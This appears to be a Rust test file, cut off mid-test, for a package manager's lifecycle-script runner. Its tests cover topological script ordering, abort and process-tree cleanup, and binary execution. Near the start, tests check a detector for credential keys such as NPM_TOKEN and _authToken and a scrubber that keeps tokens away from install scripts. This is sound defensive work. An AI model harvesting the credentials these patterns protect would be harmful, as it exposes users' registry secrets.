use crate::*;
use std::collections::{HashMap, VecDeque};
use std::path::PathBuf;

#[test]
fn test_is_sensitive_credential_key() {
    assert!(is_sensitive_credential_key("NPM_TOKEN"));
    assert!(is_sensitive_credential_key("_authToken"));
    assert!(is_sensitive_credential_key(
        "//registry.npmjs.org/:_authToken"
    ));
    assert!(is_sensitive_credential_key("npm_config_password"));
    assert!(is_sensitive_credential_key("secret_key"));
    assert!(is_sensitive_credential_key("AUTH_TOKEN"));
    assert!(is_sensitive_credential_key("_auth"));

    // Non-sensitive keys
    assert!(!is_sensitive_credential_key("PATH"));
    assert!(!is_sensitive_credential_key("AUTHOR"));
    assert!(!is_sensitive_credential_key("npm_package_author"));
    assert!(!is_sensitive_credential_key("INIT_CWD"));
    assert!(!is_sensitive_credential_key("NODE_ENV"));
}

#[test]
fn test_build_lifecycle_env_scrubbing() {
    let mut ctx = LifecycleContext::new(
        PathBuf::from("/project"),
        PathBuf::from("/project/node_modules/my-pkg"),
        "my-pkg",
        "postinstall",
        "echo 1",
    );
    ctx.extra_env.insert(
        "npm_config__authToken".to_string(),
        "leak_token_123".to_string(),
    );
    ctx.extra_env.insert(
        "//127.0.0.1:4873/:_authToken".to_string(),
        "leak_token_456".to_string(),
    );
    ctx.extra_env
        .insert("SAFE_VAR".to_string(), "safe_value".to_string());

    let env = build_lifecycle_env(&ctx);

    assert_eq!(env.get("SAFE_VAR").unwrap(), "safe_value");
    assert_eq!(env.get("npm_lifecycle_event").unwrap(), "postinstall");
    assert_eq!(env.get("npm_package_name").unwrap(), "my-pkg");
    assert_eq!(env.get("INIT_CWD").unwrap(), "/project");

    // Verify sensitive keys are scrubbed
    assert!(!env.contains_key("npm_config__authToken"));
    assert!(!env.contains_key("//127.0.0.1:4873/:_authToken"));
}

#[test]
fn test_execute_lifecycle_script_runs() {
    let temp = tempfile::tempdir().unwrap();
    let ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "test-pkg",
        "test-event",
        "node -e \"process.exit(0)\"",
    );
    let status = execute_lifecycle_script(&ctx).unwrap();
    assert!(status.success());
}

#[tokio::test]
async fn test_optional_lifecycle_script_failure_isolation() {
    let temp = tempfile::tempdir().unwrap();
    let pkg_dir = temp.path().join("node_modules").join("failing-opt-pkg");
    std::fs::create_dir_all(&pkg_dir).unwrap();

    let mut failing_manifest = Manifest::default();
    failing_manifest.name = Some("failing-opt-pkg".to_string());
    failing_manifest.version = Some("1.0.0".to_string());
    failing_manifest.scripts.insert(
        "install".to_string(),
        "node -e \"process.exit(1)\"".to_string(),
    );

    let node = LifecyclePackageNode {
        package_path: "node_modules/failing-opt-pkg".to_string(),
        disk_path: pkg_dir.clone(),
        manifest: failing_manifest.clone(),
        source: PackageSource::Registry,
        dependencies: vec![],
        optional: true,
    };

    let root_manifest = Manifest::default();
    let opts = LifecycleOptions {
        root_dir: temp.path().to_path_buf(),
        init_cwd: temp.path().to_path_buf(),
        ignore_scripts: false,
        capture_output: true,
        foreground_scripts: false,
        timeout: None,
        sandbox_policy: ScriptSandboxPolicy::default(),
        node_gyp: None,
        offline: false,
    };

    // When optional is true, script failure is isolated and does NOT fail execution
    let res = execute_topological(&[node], &root_manifest, &opts).await;
    assert!(
        res.is_ok(),
        "Optional script failure should not fail execute_topological"
    );

    // Contrast with optional = false: MUST fail!
    let non_opt_pkg_dir = temp.path().join("node_modules").join("failing-req-pkg");
    std::fs::create_dir_all(&non_opt_pkg_dir).unwrap();

    let req_node = LifecyclePackageNode {
        package_path: "node_modules/failing-req-pkg".to_string(),
        disk_path: non_opt_pkg_dir,
        manifest: failing_manifest,
        source: PackageSource::Registry,
        dependencies: vec![],
        optional: false,
    };

    let req_res = execute_topological(&[req_node], &root_manifest, &opts).await;
    assert!(
        req_res.is_err(),
        "Required script failure MUST fail execute_topological"
    );
}

#[test]
fn test_process_tree_guard_containment() {
    let guard = process_guard::ProcessTreeGuard::new();
    assert!(
        guard.is_some(),
        "Job object / process tree guard should be created"
    );

    // Terminate empty guard returns true (or success)
    if let Some(g) = guard {
        assert!(g.terminate(0));
    }
}

#[tokio::test]
async fn test_execute_workspace_scripts_topological() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    // Set up two workspace packages: lib-a and app (app depends on lib-a)
    let lib_a_dir = root.join("packages").join("lib-a");
    let app_dir = root.join("packages").join("app");
    std::fs::create_dir_all(&lib_a_dir).unwrap();
    std::fs::create_dir_all(&app_dir).unwrap();

    let marker_file = root.join("run_order.txt");

    let mut manifest_a = Manifest::default();
    manifest_a.name = Some("lib-a".to_string());
    manifest_a.version = Some("1.0.0".to_string());
    // Write "lib-a\n" to marker_file
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");
    manifest_a.scripts.insert(
        "build".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'lib-a\\n')\""),
    );

    let mut manifest_app = Manifest::default();
    manifest_app.name = Some("app".to_string());
    manifest_app.version = Some("2.0.0".to_string());
    manifest_app.scripts.insert(
        "build".to_string(),
        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'app\\n')\""),
    );

    let members = vec![
        WorkspaceScriptMember {
            name: "lib-a".to_string(),
            path: lib_a_dir,
            manifest: manifest_a,
        },
        WorkspaceScriptMember {
            name: "app".to_string(),
            path: app_dir,
            manifest: manifest_app,
        },
    ];

    // Topological order: leaf ("lib-a") first, then dependent ("app")
    let topo_order = vec!["lib-a".to_string(), "app".to_string()];

    let opts = WorkspaceRunOptions {
        script: "build".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: None,
    };

    let summary = execute_workspace_scripts_topological(root, &members, &topo_order, &opts)
        .await
        .unwrap();

    assert_eq!(summary.executed_packages, vec!["lib-a", "app"]);

    let content = std::fs::read_to_string(&marker_file).unwrap();
    let lines: Vec<&str> = content.lines().collect();
    assert_eq!(lines, vec!["lib-a", "app"]);
}

#[test]
fn test_scrub_text_redactions() {
    let raw = "Header: Bearer secret_token_xyz123; auth_pkg_token: npm_12345678901234567890123456789012 _authToken=my_secret_token_val password=pass1234";
    let scrubbed = scrub_text(raw);

    assert!(!scrubbed.contains("secret_token_xyz123"));
    assert!(!scrubbed.contains("npm_12345678901234567890123456789012"));
    assert!(!scrubbed.contains("my_secret_token_val"));
    assert!(!scrubbed.contains("pass1234"));

    assert!(scrubbed.contains("Bearer [REDACTED]"));
    assert!(scrubbed.contains("npm_[REDACTED]"));
    assert!(scrubbed.contains("_authToken=[REDACTED]"));
    assert!(scrubbed.contains("password=[REDACTED]"));
}

#[test]
fn test_hierarchical_path_ancestor_resolution() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().to_path_buf();

    let intermediate = root.join("packages").join("frontend");
    let leaf = intermediate.join("apps").join("web");

    let root_bin = root.join("node_modules").join(".bin");
    let intermediate_bin = intermediate.join("node_modules").join(".bin");
    let leaf_bin = leaf.join("node_modules").join(".bin");

    std::fs::create_dir_all(&root_bin).unwrap();
    std::fs::create_dir_all(&intermediate_bin).unwrap();
    std::fs::create_dir_all(&leaf_bin).unwrap();

    let ctx = LifecycleContext::new(&root, &leaf, "web", "build", "echo 1");

    let env = build_lifecycle_env(&ctx);
    let path = env.get("PATH").unwrap();

    // Verify all three ancestor .bin directories are present in PATH
    assert!(path.contains(&leaf_bin.to_string_lossy().to_string()));
    assert!(path.contains(&intermediate_bin.to_string_lossy().to_string()));
    assert!(path.contains(&root_bin.to_string_lossy().to_string()));
}

#[tokio::test]
async fn test_topological_dependency_cycle_prevention() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().to_path_buf();

    // Package A depends on B, Package B depends on A
    let mut manifest_a = Manifest::default();
    manifest_a.name = Some("pkg-a".to_string());
    manifest_a.scripts.insert(
        "install".to_string(),
        "node -e \"process.exit(0)\"".to_string(),
    );

    let mut manifest_b = Manifest::default();
    manifest_b.name = Some("pkg-b".to_string());
    manifest_b.scripts.insert(
        "install".to_string(),
        "node -e \"process.exit(0)\"".to_string(),
    );

    let node_a = LifecyclePackageNode {
        package_path: "node_modules/pkg-a".to_string(),
        disk_path: root.join("node_modules").join("pkg-a"),
        manifest: manifest_a,
        source: PackageSource::Registry,
        dependencies: vec!["pkg-b".to_string()],
        optional: false,
    };

    let node_b = LifecyclePackageNode {
        package_path: "node_modules/pkg-b".to_string(),
        disk_path: root.join("node_modules").join("pkg-b"),
        manifest: manifest_b,
        source: PackageSource::Registry,
        dependencies: vec!["pkg-a".to_string()],
        optional: false,
    };

    std::fs::create_dir_all(&node_a.disk_path).unwrap();
    std::fs::create_dir_all(&node_b.disk_path).unwrap();

    let root_manifest = Manifest::default();
    let opts = LifecycleOptions {
        root_dir: root.clone(),
        init_cwd: root.clone(),
        ignore_scripts: false,
        capture_output: true,
        foreground_scripts: false,
        timeout: None,
        sandbox_policy: ScriptSandboxPolicy::default(),
        node_gyp: None,
        offline: false,
    };

    // Cyclic dependency should NOT overflow the stack and should successfully execute
    let res = execute_topological(&[node_a, node_b], &root_manifest, &opts).await;
    assert!(
        res.is_ok(),
        "Cycle should be gracefully handled without stack overflow"
    );
}

#[tokio::test]
async fn test_optional_dependency_disk_removal_on_failure() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().to_path_buf();

    let opt_dir = root.join("node_modules").join("optional-fail-pkg");
    std::fs::create_dir_all(&opt_dir).unwrap();
    assert!(
        opt_dir.exists(),
        "Directory should exist prior to script execution"
    );

    let mut manifest = Manifest::default();
    manifest.name = Some("optional-fail-pkg".to_string());
    manifest.version = Some("1.0.0".to_string());
    // Failing script
    manifest.scripts.insert(
        "preinstall".to_string(),
        "node -e \"process.exit(1)\"".to_string(),
    );
    // Subsequent hook should be skipped
    manifest.scripts.insert(
        "install".to_string(),
        "node -e \"process.exit(1)\"".to_string(),
    );

    let node = LifecyclePackageNode {
        package_path: "node_modules/optional-fail-pkg".to_string(),
        disk_path: opt_dir.clone(),
        manifest,
        source: PackageSource::Registry,
        dependencies: vec![],
        optional: true,
    };

    let root_manifest = Manifest::default();
    let opts = LifecycleOptions {
        root_dir: root.clone(),
        init_cwd: root.clone(),
        ignore_scripts: false,
        capture_output: true,
        foreground_scripts: false,
        timeout: None,
        sandbox_policy: ScriptSandboxPolicy::default(),
        node_gyp: None,
        offline: false,
    };

    let res = execute_topological(&[node], &root_manifest, &opts).await;
    assert!(res.is_ok(), "Optional dependency failure must be isolated");
    assert!(
        !opt_dir.exists(),
        "Optional dependency directory must be removed on failure"
    );
}

#[test]
fn test_windows_job_object_grandchild_cleanup() {
    let guard = process_guard::ProcessTreeGuard::new();
    assert!(guard.is_some(), "ProcessTreeGuard should be created");

    if let Some(ref g) = guard {
        // Spawn a child process using platform shell that spawns a background grandchild
        #[cfg(windows)]
        {
            use std::os::windows::io::AsRawHandle;
            let mut cmd = std::process::Command::new("cmd.exe");
            cmd.arg("/c").arg("node -e \"process.exit(0)\"");
            if let Ok(child) = cmd.spawn() {
                assert!(g.assign_process(child.as_raw_handle()));
            }
        }
        // Force terminate cleans up any grandchildren
        assert!(g.terminate(0));
    }
}

#[tokio::test]
async fn test_async_cancellation_terminates_process() {
    let temp = tempfile::tempdir().unwrap();
    let ctx = LifecycleContext::new(
        temp.path(),
        temp.path(),
        "long-running-pkg",
        "preinstall",
        "node -e \"setTimeout(() => {}, 60000)\"",
    );

    // Cancel the execution after 150ms
    let start = std::time::Instant::now();
    tokio::select! {
        _ = execute_lifecycle_script_async(&ctx) => {
            panic!("Script should have been cancelled before completing");
        }
        _ = tokio::time::sleep(std::time::Duration::from_millis(150)) => {
            // Future was dropped here, triggering CancellationGuard termination
        }
    }
    assert!(start.elapsed() < std::time::Duration::from_secs(5));
}

#[tokio::test]
async fn test_process_tree_abort_signal_kills_entire_subtree() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let grandchild_pid_file = root.join("grandchild.pid");
    let escaped_pid_file = grandchild_pid_file.to_string_lossy().replace('\\', "/");

    let script_file = root.join("spawn_tree.js");
    let script_js = format!(
        "const {{ spawn }} = require('child_process');\n\
        const g = spawn(process.execPath, [\n\
            '-e',\n\
            `require('fs').writeFileSync('{escaped_pid_file}', String(process.pid)); setInterval(() => {{}}, 1000);`\n\
        ], {{ stdio: 'ignore' }});\n\
        setInterval(() => {{}}, 1000);\n"
    );
    std::fs::write(&script_file, script_js).unwrap();

    let escaped_script_file = script_file.to_string_lossy().replace('\\', "/");
    let script_cmd = format!("node \"{escaped_script_file}\"");

    let ctx = LifecycleContext::new(root, root, "process-tree-test", "preinstall", &script_cmd);

    let (abort_tx, abort_rx) = tokio::sync::watch::channel(false);

    let abort_fut = async move {
        let mut rx = abort_rx;
        let _ = rx.wait_for(|&v| v).await;
    };

    // Spawn script in background
    let mut exec_task =
        tokio::spawn(async move { execute_lifecycle_script_with_abort(&ctx, abort_fut).await });

    // Wait until the grandchild has started and written its PID
    let pid = wait_for_grandchild_pid(&grandchild_pid_file, &mut exec_task).await;
    assert!(
        process_guard::is_process_running(pid),
        "Grandchild process {pid} must be actively running"
    );

    // Send abort signal
    let _ = abort_tx.send(true);

    // Wait for task to finish with error
    let res = exec_task.await.unwrap();
    assert!(
        res.is_err(),
        "Lifecycle execution must terminate with error on abort"
    );

    wait_for_process_exit(pid).await;

    // Verify the grandchild process was cleanly terminated and not orphaned
    assert!(
        !process_guard::is_process_running(pid),
        "Grandchild process {pid} must be terminated upon abort signal, no orphans allowed"
    );
}

// Startup and OS cleanup are scheduling events, not fixed-duration sleeps.
// On loaded hosts, two Node startups can take longer than an entire old test.
async fn wait_for_grandchild_pid(
    file: &std::path::Path,
    task: &mut tokio::task::JoinHandle<anyhow::Result<std::process::ExitStatus>>,
) -> u32 {
    let ready = async {
        loop {
            if let Ok(text) = std::fs::read_to_string(file) {
                if let Ok(pid) = text.trim().parse::<u32>() {
                    return pid;
                }
            }
            if task.is_finished() {
                panic!(
                    "Lifecycle exited before grandchild readiness: {:?}",
                    (&mut *task).await
                );
            }
            tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        }
    };
    match tokio::time::timeout(std::time::Duration::from_secs(90), ready).await {
        Ok(pid) => pid,
        Err(_) => {
            task.abort();
            panic!(
                "Grandchild did not record its PID within 90 seconds: {}",
                file.display()
            );
        }
    }
}

async fn wait_for_process_exit(pid: u32) {
    tokio::time::timeout(std::time::Duration::from_secs(60), async {
        while process_guard::is_process_running(pid) {
            tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        }
    })
    .await
    .expect("Terminated grandchild must actually exit, without orphaned processes");
}

#[tokio::test]
async fn test_workspace_execution_aborts_and_halts_remaining_packages() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let marker_file = root.join("workspace_abort_order.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    let mut members = Vec::new();
    let names = ["pkg-abort-1", "pkg-abort-2", "pkg-abort-3"];

    for name in &names {
        let pkg_dir = root.join("packages").join(name);
        std::fs::create_dir_all(&pkg_dir).unwrap();

        let mut manifest = Manifest::default();
        manifest.name = Some(name.to_string());
        manifest.version = Some("1.0.0".to_string());

        let cmd = if *name == "pkg-abort-1" {
            // First package logs its start and sleeps
            format!(
                "node -e \"require('fs').appendFileSync('{escaped_marker}', '{name}\\n'); setTimeout(()=>{{}}, 60000)\""
            )
        } else {
            format!("node -e \"require('fs').appendFileSync('{escaped_marker}', '{name}\\n')\"")
        };

        manifest.scripts.insert("build".to_string(), cmd);

        members.push(WorkspaceScriptMember {
            name: name.to_string(),
            path: pkg_dir,
            manifest,
        });
    }

    let topo_order = names.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    let opts = WorkspaceRunOptions {
        script: "build".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: None,
    };

    let (abort_tx, abort_rx) = tokio::sync::watch::channel(false);

    let members_clone = members.clone();
    let root_path = root.to_path_buf();
    let run_task = tokio::spawn(async move {
        execute_workspace_scripts_topological_with_abort(
            &root_path,
            &members_clone,
            &topo_order,
            &opts,
            Some(abort_rx),
        )
        .await
    });

    // Wait until pkg-abort-1 starts running and writes marker
    for _ in 0..60 {
        tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        if marker_file.exists() {
            if let Ok(content) = std::fs::read_to_string(&marker_file) {
                if content.contains("pkg-abort-1") {
                    break;
                }
            }
        }
    }

    // Trigger abort
    let _ = abort_tx.send(true);

    let res = run_task.await.unwrap();
    assert!(res.is_err(), "Workspace execution must abort on signal");

    // Verify subsequent packages (pkg-abort-2, pkg-abort-3) NEVER ran
    let content = std::fs::read_to_string(&marker_file).unwrap_or_default();
    assert!(content.contains("pkg-abort-1"));
    assert!(
        !content.contains("pkg-abort-2"),
        "pkg-abort-2 should not have run after abort"
    );
    assert!(
        !content.contains("pkg-abort-3"),
        "pkg-abort-3 should not have run after abort"
    );
}

#[tokio::test]
async fn test_monorepo_topological_sort_stress_large_dag() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let marker_file = root.join("stress_dag_exec_order.txt");
    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");

    // Construct a complex monorepo DAG with 65 packages across 4 disconnected components:
    // Component 1: Infrastructure tier (20 packages with diamonds and deep chains)
    // Component 2: Frontend tier (25 packages with wide fan-outs and multi-parents)
    // Component 3: Data pipeline (15 packages with multi-stage aggregators)
    // Component 4: Isolated packages (5 standalone packages)
    let total_pkgs = 65;
    let mut members = Vec::with_capacity(total_pkgs);
    let mut dependencies: HashMap<String, Vec<String>> = HashMap::new();

    // 1. Component 1: infra-00 to infra-19 (20 packages)
    for i in 0..20 {
        let name = format!("infra-{i:02}");
        let mut deps = Vec::new();
        if i == 1 || i == 2 || i == 3 {
            deps.push("infra-00".to_string());
        } else if i == 4 {
            // Diamond: depends on 1 and 2
            deps.push("infra-01".to_string());
            deps.push("infra-02".to_string());
        } else if i == 5 {
            // Diamond: depends on 2 and 3
            deps.push("infra-02".to_string());
            deps.push("infra-03".to_string());
        } else if (6..=15).contains(&i) {
            // Deep chain
            deps.push(format!("infra-{:02}", i - 1));
        } else if i == 16 || i == 17 || i == 18 {
            // Fan-out from 15
            deps.push("infra-15".to_string());
        } else if i == 19 {
            // Fan-in from 16, 17, 18
            deps.push("infra-16".to_string());
            deps.push("infra-17".to_string());
            deps.push("infra-18".to_string());
        }
        dependencies.insert(name.clone(), deps);
    }

    // 2. Component 2: ui-00 to ui-24 (25 packages, disconnected from infra)
    for i in 0..25 {
        let name = format!("ui-{i:02}");
        let mut deps = Vec::new();
        if (2..=7).contains(&i) {
            // Wide fan-out from leaves ui-00, ui-01
            deps.push("ui-00".to_string());
            if i % 2 == 0 {
                deps.push("ui-01".to_string());
            }
        } else if (8..=15).contains(&i) {
            // Cross-component intermediate UI dependencies
            deps.push(format!("ui-{:02}", i - 6));
            deps.push(format!("ui-{:02}", i - 5));
        } else if (16..=23).contains(&i) {
            // Higher-level UI widgets
            deps.push(format!("ui-{:02}", i - 8));
        } else if i == 24 {
            // Top-level application fanning in multiple widgets
            deps.push("ui-20".to_string());
            deps.push("ui-21".to_string());
            deps.push("ui-22".to_string());
            deps.push("ui-23".to_string());
        }
        dependencies.insert(name.clone(), deps);
    }

    // 3. Component 3: data-00 to data-14 (15 packages, disconnected from infra and ui)
    for i in 0..15 {
        let name = format!("data-{i:02}");
        let mut deps = Vec::new();
        if (1..=4).contains(&i) {
            deps.push("data-00".to_string());
        } else if (5..=9).contains(&i) {
            deps.push(format!("data-{:02}", i - 4));
            deps.push("data-00".to_string());
        } else if (10..=13).contains(&i) {
            deps.push(format!("data-{:02}", i - 5));
        } else if i == 14 {
            deps.push("data-10".to_string());
            deps.push("data-11".to_string());
            deps.push("data-12".to_string());
            deps.push("data-13".to_string());
        }
        dependencies.insert(name.clone(), deps);
    }

    // 4. Component 4: standalone-00 to standalone-04 (5 isolated packages)
    for i in 0..5 {
        let name = format!("standalone-{i:02}");
        dependencies.insert(name.clone(), Vec::new());
    }

    // Create manifest and directories for all 65 packages
    let mut all_names = Vec::new();
    for name in dependencies.keys() {
        all_names.push(name.clone());
        let pkg_dir = root.join("packages").join(name);
        std::fs::create_dir_all(&pkg_dir).unwrap();

        let mut manifest = Manifest::default();
        manifest.name = Some(name.clone());
        manifest.version = Some("1.0.0".to_string());

        // Script appends "name\n" to marker_file
        manifest.scripts.insert(
            "stress-build".to_string(),
            format!("node -e \"require('fs').appendFileSync('{escaped_marker}', '{name}\\n')\""),
        );

        members.push(WorkspaceScriptMember {
            name: name.clone(),
            path: pkg_dir,
            manifest,
        });
    }

    // Compute topological order across all 65 packages using Kahn's algorithm
    let mut in_degree: HashMap<String, usize> = HashMap::new();
    let mut adj: HashMap<String, Vec<String>> = HashMap::new();

    for name in &all_names {
        in_degree.insert(name.clone(), 0);
        adj.insert(name.clone(), Vec::new());
    }

    for (pkg, deps) in &dependencies {
        for dep in deps {
            adj.get_mut(dep).unwrap().push(pkg.clone());
            *in_degree.get_mut(pkg).unwrap() += 1;
        }
    }

    let mut ready = VecDeque::new();
    let mut sorted_names = all_names.clone();
    sorted_names.sort();

    for name in &sorted_names {
        if in_degree[name] == 0 {
            ready.push_back(name.clone());
        }
    }

    let mut topo_order = Vec::new();
    while let Some(curr) = ready.pop_front() {
        topo_order.push(curr.clone());
        let mut dependents = adj[&curr].clone();
        dependents.sort();
        for dep in dependents {
            let deg = in_degree.get_mut(&dep).unwrap();
            *deg -= 1;
            if *deg == 0 {
                ready.push_back(dep);
            }
        }
    }

    assert_eq!(
        topo_order.len(),
        total_pkgs,
        "All 65 packages must be included in computed topological order"
    );

    let opts = WorkspaceRunOptions {
        script: "stress-build".to_string(),
        args: vec![],
        ignore_scripts: false,
        foreground_scripts: false,
        strict_sandbox: false,
        if_present: false,
        filter_members: None,
    };

    let summary = execute_workspace_scripts_topological(root, &members, &topo_order, &opts)
        .await
        .expect("Workspace stress execution should succeed without errors");

    assert_eq!(summary.executed_packages.len(), total_pkgs);

    // Read recorded execution order from marker file
    let content = std::fs::read_to_string(&marker_file).expect("Marker file should exist");
    let executed_sequence: Vec<&str> = content.lines().collect();
    assert_eq!(executed_sequence.len(), total_pkgs);

    let mut executed_index_map: HashMap<&str, usize> = HashMap::new();
    for (idx, &name) in executed_sequence.iter().enumerate() {
        executed_index_map.insert(name, idx);
    }

    // Verify the topological invariant for ALL 65 packages:
    // If package A depends on package B, B MUST appear before A in executed_sequence!
    for (pkg, deps) in &dependencies {
        let pkg_idx = *executed_index_map.get(pkg.as_str()).unwrap();
        for dep in deps {
            let dep_idx = *executed_index_map.get(dep.as_str()).unwrap();
            assert!(
                dep_idx < pkg_idx,
                "Topological invariant violated! Dependency '{dep}' (index {dep_idx}) executed AFTER dependent '{pkg}' (index {pkg_idx})"
            );
        }
    }
}

#[tokio::test]
async fn test_lifecycle_topological_stress_50_plus_packages() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path().to_path_buf();

    // Test execute_topological with 60 LifecyclePackageNodes across multiple components
    let count = 60;
    let mut nodes = Vec::with_capacity(count);
    let mut dependencies: HashMap<String, Vec<String>> = HashMap::new();

    for i in 0..count {
        let name = format!("pkg-dag-{i:02}");
        let pkg_dir = root.join("node_modules").join(&name);
        std::fs::create_dir_all(&pkg_dir).unwrap();

        let mut manifest = Manifest::default();
        manifest.name = Some(name.clone());
        manifest.version = Some("1.0.0".to_string());
        manifest.scripts.insert(
            "install".to_string(),
            "node -e \"process.exit(0)\"".to_string(),
        );

        let mut deps = Vec::new();
        if (1..10).contains(&i) {
            deps.push("pkg-dag-00".to_string());
        } else if (10..30).contains(&i) {
            deps.push(format!("pkg-dag-{:02}", i - 5));
            deps.push(format!("pkg-dag-{:02}", i - 3));
        } else if (30..50).contains(&i) {
            deps.push(format!("pkg-dag-{:02}", i - 1));
        }
        // packages 50..60 are disconnected components / leaves

        dependencies.insert(name.clone(), deps.clone());

        nodes.push(LifecyclePackageNode {
            package_path: format!("node_modules/{name}"),
            disk_path: pkg_dir,
            manifest,
            source: PackageSource::Registry,
            dependencies: deps,
            optional: false,
        });
    }

    let root_manifest = Manifest::default();
    let opts = LifecycleOptions {
        root_dir: root.clone(),
        init_cwd: root.clone(),
        ignore_scripts: false,
        capture_output: true,
        foreground_scripts: false,
        timeout: None,
        sandbox_policy: ScriptSandboxPolicy::default(),
        node_gyp: None,
        offline: false,
    };

    let res = execute_topological(&nodes, &root_manifest, &opts).await;
    assert!(
        res.is_ok(),
        "Large 60-package topological lifecycle execution should succeed"
    );
}

#[test]
fn test_glob_match_and_matches_filter() {
    let root = PathBuf::from("/workspace/monorepo");
    let member_path = root.join("packages").join("ui-button");

    // Exact matches
    assert!(matches_filter(
        "ui-button",
        "ui-button",
        &member_path,
        &root
    ));
    assert!(!matches_filter("ui-card", "ui-button", &member_path, &root));

    // Scoped matches
    let scoped_path = root.join("packages").join("core");
    assert!(matches_filter(
        "@scope/core",
        "@scope/core",
        &scoped_path,
        &root
    ));
    assert!(matches_filter("@scope", "@scope/core", &scoped_path, &root));
    assert!(matches_filter(
        "@scope/*",
        "@scope/core",
        &scoped_path,
        &root
    ));
    assert!(matches_filter(
        "@scope/c*",
        "@scope/core",
        &scoped_path,
        &root
    ));
    assert!(!matches_filter(
        "@other",
        "@scope/core",
        &scoped_path,
        &root
    ));

    // Glob matches
    assert!(matches_filter("ui-*", "ui-button", &member_path, &root));
    assert!(matches_filter("*-button", "ui-button", &member_path, &root));
    assert!(matches_filter(
        "ui-b?tt?n",
        "ui-button",
        &member_path,
        &root
    ));
    assert!(!matches_filter("api-*", "ui-button", &member_path, &root));

    // Path matches
    assert!(matches_filter(
        "packages/ui-button",
        "ui-button",
        &member_path,
        &root
    ));
    assert!(matches_filter(
        "./packages/ui-button",
        "ui-button",
        &member_path,
        &root
    ));
    assert!(matches_filter(
        "packages/*",
        "ui-button",
        &member_path,
        &root
    ));
    assert!(!matches_filter("apps/*", "ui-button", &member_path, &root));
}

#[test]
fn test_find_local_binary_and_ancestor_collection() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    // Create root node_modules/.bin
    let bin_dir = root.join("node_modules").join(".bin");
    std::fs::create_dir_all(&bin_dir).unwrap();

    let bin_name = if cfg!(windows) {
        "my-tool.cmd"
    } else {
        "my-tool"
    };
    let bin_file = bin_dir.join(bin_name);
    std::fs::write(&bin_file, "dummy content").unwrap();

    // Create deep child directory
    let child_dir = root.join("packages").join("nested").join("deep");
    std::fs::create_dir_all(&child_dir).unwrap();

    // find_local_binary traversing up from child_dir must find my-tool
    let found = find_local_binary(&child_dir, "my-tool");
    assert!(
        found.is_some(),
        "Should find my-tool in ancestor node_modules/.bin"
    );
    let found_path = found.unwrap();
    assert_eq!(
        found_path.file_name().unwrap(),
        std::ffi::OsStr::new(bin_name)
    );

    // collect_ancestor_bin_dirs should include the ancestor bin dir
    let ancestor_bins = collect_ancestor_bin_dirs(&child_dir);
    assert!(ancestor_bins.contains(&bin_dir));
}

#[tokio::test]
async fn test_execute_binary_exit_code_fidelity() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    // Write a node script that exits with custom non-zero code 42
    let script = root.join("exit_with_code.js");
    std::fs::write(&script, "#!/usr/bin/env node\nprocess.exit(42);\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755))
            .expect("Setting 0o755 permissions on test script must succeed");
    }

    let status = execute_binary_async(&script, &[], root, &[], &HashMap::new())
        .await
        .expect("Binary spawn should execute");

    assert!(!status.success());
    let code = extract_exit_status_code(&status);
    assert_eq!(
        code, 42,
        "Exit status code must be preserved faithfully as 42"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn test_execute_binary_unix_shebang_flags_honored() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    // Executable tool.js beginning with `#!/usr/bin/env -S node --expose-gc`
    // must honor the shebang flags when executed via Command::new on Unix.
    let script = root.join("tool.js");
    std::fs::write(
        &script,
        "#!/usr/bin/env -S node --expose-gc\nprocess.exit(typeof global.gc === 'function' ? 0 : 42);\n",
    )
    .unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755))
        .expect("Setting 0o755 permissions must succeed");

    let status = execute_binary_async(&script, &[], root, &[], &HashMap::new())
        .await
        .expect("Executable tool.js with shebang must execute directly");

    let code = extract_exit_status_code(&status);
    assert_eq!(
        code, 0,
        "Shebang flags (--expose-gc) must be honored so global.gc is defined"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn test_execute_binary_unix_non_executable_rejected() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    // Mode 0o644 file must NOT be executable simply due to having a .js extension
    let script = root.join("non_exec.js");
    std::fs::write(&script, "#!/usr/bin/env node\nprocess.exit(0);\n").unwrap();
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o644))
        .expect("Setting 0o644 permissions must succeed");

    let res = execute_binary_async(&script, &[], root, &[], &HashMap::new()).await;
    assert!(
        res.is_err(),
        "Non-executable .js file must fail to spawn on Unix with permission error"
    );
}

#[tokio::test]
async fn test_execute_binary_with_abort_cancellation() {
    let temp = tempfile::tempdir().unwrap();
    let root = temp.path();

    let script = root.join("long_running.js");
    std::fs::write(
        &script,
        "#!/usr/bin/env node\nsetInterval(() => {}, 1000);\n",
    )
    .unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755))
